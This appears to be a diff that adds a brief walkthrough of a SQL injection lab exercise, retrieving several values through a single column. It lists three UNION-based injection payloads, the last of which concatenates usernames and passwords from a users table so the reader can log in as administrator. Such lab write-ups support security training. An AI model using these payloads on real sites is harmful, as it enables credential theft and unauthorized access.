@@ -1,0 +1,15 @@
+SQL injection UNION attack, retrieving multiple values in a single column
+
+We start by identifying the total number of columns:
+
+'UNION+SELECT+NULL,NULL--
+
+Then we look for the columns containing text:
+
+'UNION+SELECT+NULL,'asdf'--
+
+Looks like there's a single column containing text. Let's pull all the data in it:
+
+'+UNION+SELECT+NULL,username||'=='||password+FROM+users--
+
+Log in as administrator and claim your victory.
